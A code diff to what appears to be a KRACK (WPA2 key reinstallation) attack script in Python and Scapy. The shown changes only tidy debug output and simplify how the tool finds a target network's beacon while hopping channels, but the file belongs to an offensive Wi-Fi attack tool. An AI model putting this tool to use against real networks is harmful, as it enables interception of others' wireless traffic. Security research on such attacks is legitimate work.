@@ -274,7 +274,7 @@ def append_csa(p, channel, count=1):
 def get_tlv_value(p, typee):
 	if not Dot11Elt in p: return None
 	print('277: ', end='')
-	print(p, p[Dot11Elt])
+	print(p[Dot11Elt].decode())
 	el = p[Dot11Elt]
 	while isinstance(el, Dot11Elt):
 		if el.ID == typee:
@@ -501,7 +501,7 @@ class KRAckAttack():
 		self.hostapd_ctrl.request("FINISH_4WAY %s" % stamac)
 
 	def find_beacon(self, ssid):
-		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11 in p and p.info == ssid, opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
+		ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # opened_socket=self.sock_real iface=self.nic_real
 		print('505: ', end='')
 		print(ps)
 		if ps is None or len(ps) < 1:
@@ -509,20 +509,7 @@ class KRAckAttack():
 			for chan in [1, 6, 11, 3, 8, 2, 7, 4, 10, 5, 9, 12, 13]:
 				self.sock_real.set_channel(chan)
 				log(DEBUG, "Listening on channel %d" % chan)
-				p = sniff(count=1, timeout=0.5, opened_socket=self.sock_real)
-				print('513: ', end='')
-				print(p)
-				for pp in p:
-					print(pp.info)
-					if pp.haslayer(Dot11):
-						if pp.type == 0 and pp.subtype == 8:
-							print('p has layer')
-							if get_tlv_value(pp, IEEE_TLV_TYPE_SSID) == ssid:
-								print('p has ssid')
-								ps = pp
-								print('521: ', end='')
-								print(ps.info)
-				# ps = sniff(count=1, timeout=0.5, lfilter=lambda p: p.haslayer(Dot11Beacon) and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
+				ps = sniff(count=1, timeout=0.5, lfilter=lambda p: Dot11 in p and get_tlv_value(p, IEEE_TLV_TYPE_SSID) == ssid, opened_socket=self.sock_real) # , opened_socket=self.sock_real
 				if ps and len(ps) >= 1: break
 
 		if ps and len(ps) >= 1:
